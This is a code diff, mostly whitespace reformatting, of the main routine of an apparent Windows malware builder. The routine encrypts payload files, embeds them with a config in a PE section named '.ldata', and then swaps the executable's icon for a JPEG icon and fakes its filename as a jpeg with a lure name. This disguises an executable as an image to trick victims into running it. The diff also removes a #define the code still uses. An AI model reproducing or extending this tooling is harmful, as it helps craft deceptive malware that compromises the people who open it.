@@ -44,7 +44,7 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 	string curpath = Public::getCurPath();
 	ret = SetCurrentDirectoryA(curpath.c_str());
 
-#define MAX_FILE_COUNT 16
+
 	char filelist[MAX_FILE_COUNT][256];
 	memset(filelist, 0, MAX_FILE_COUNT * 256);
 	int iFlag = 0;
@@ -53,12 +53,12 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 	string dstcryptfn = "test.dat";
 	string dstcfgfn = "config.dat";
 
-	for (int i = 1;i < argc; )
+	for (int i = 1; i < argc; )
 	{
-		if (lstrcmpiA(argv[i],"-be") == 0)
+		if (lstrcmpiA(argv[i], "-be") == 0)
 		{
 			iFlag = 3;
-			for (int j=i+1,k = 0;k < 2;j ++,k++)
+			for (int j = i + 1, k = 0; k < 2; j++, k++)
 			{
 				lstrcpyA(filelist[k], argv[j]);
 				paramscnt++;
@@ -69,7 +69,7 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 		else if (lstrcmpiA(argv[i], "-bd") == 0)
 		{
 			iFlag = 4;
-			for (int j = i + 1, k = 0; k < 2; j++,k++)
+			for (int j = i + 1, k = 0; k < 2; j++, k++)
 			{
 				lstrcpyA(filelist[k], argv[j]);
 				paramscnt++;
@@ -81,7 +81,7 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 		else if (lstrcmpiA(argv[i], "-dh") == 0)
 		{
 			iFlag = 4;
-			Crypto::cryptPayloadFile(argv[i+1], dstcryptfn);
+			Crypto::cryptPayloadFile(argv[i + 1], dstcryptfn);
 			lstrcpyA(filelist[paramscnt], dstcryptfn.c_str());
 			paramscnt++;
 			i += 2;
@@ -90,7 +90,7 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 		else if (lstrcmpiA(argv[i], "-eh") == 0)
 		{
 			iFlag = 3;
-			Crypto::cryptPayloadFile(argv[i+1], dstcryptfn);
+			Crypto::cryptPayloadFile(argv[i + 1], dstcryptfn);
 			lstrcpyA(filelist[paramscnt], dstcryptfn.c_str());
 			paramscnt++;
 			i += 2;
@@ -99,20 +99,20 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 		else if (lstrcmpiA(argv[i], "-e") == 0)
 		{
 			iFlag = 1;
-			lstrcpyA(filelist[0], argv[i+1]);
+			lstrcpyA(filelist[0], argv[i + 1]);
 			paramscnt++;
 			i += 2;
 			continue;
 		}
-		else if (lstrcmpiA(argv[i], "-d")==0)
+		else if (lstrcmpiA(argv[i], "-d") == 0)
 		{
 			iFlag = 2;
-			lstrcpyA(filelist[0], argv[i+1]);
+			lstrcpyA(filelist[0], argv[i + 1]);
 			paramscnt++;
 			i += 2;
 			continue;
 		}
-		else if (lstrcmpiA(argv[i], "-o")==0)
+		else if (lstrcmpiA(argv[i], "-o") == 0)
 		{
 			lstrcpyA(szoutFn, argv[i + 1]);
 			i += 2;
@@ -120,18 +120,19 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 		}
 		else if (lstrcmpiA(argv[i], "-c") == 0)
 		{
-			Public::prepareCfg(argv[i+1], dstcfgfn);
+			Public::prepareCfg(argv[i + 1], dstcfgfn);
 			lstrcpyA(filelist[paramscnt], dstcfgfn.c_str());
 			paramscnt++;
 
 			i += 2;
 			continue;
-		}else if (lstrcmpiA(argv[i], "-p") == 0)
+		}
+		else if (lstrcmpiA(argv[i], "-p") == 0)
 		{
 			lstrcpyA(filelist[paramscnt], "config.dat");
 			paramscnt++;
 
-			Public::prepareParams(argv[i + 1],argv[i+2],dstcfgfn);
+			Public::prepareParams(argv[i + 1], argv[i + 2], dstcfgfn);
 
 			i += 3;
 			continue;
@@ -141,17 +142,17 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 	}
 
 	char szSegName[] = { '.','l','d','a','t','a',0 };
-	string resultfn = Section::insertSection(iFlag, szSegName, filelist, paramscnt,szoutFn);
+	string resultfn = Section::insertSection(iFlag, szSegName, filelist, paramscnt, szoutFn);
 	if (resultfn == "")
 	{
 		printf("something error happened\r\n");
 		getchar();
 		return -1;
 	}
-	
+
 	if (strstr(argv[1], "r")) {
 		ChangeIcon(resultfn.c_str(), "jpg.ico");
-		FakeFilename::fakefn(resultfn,"jpeg","香港之路");
+		FakeFilename::fakefn(resultfn, "jpeg", "香港之路");
 	}
 
 	printf("work complete\r\n");
@@ -175,6 +176,6 @@ int __stdcall wWinMain(HINSTANCE inst, HINSTANCE prev, PWSTR cmdline, int showmo
 void test() {
 
 
-	Resource::getResource((DWORD)GetModuleHandle(0),"");
+	Resource::getResource((DWORD)GetModuleHandle(0), "");
 	return;
 }
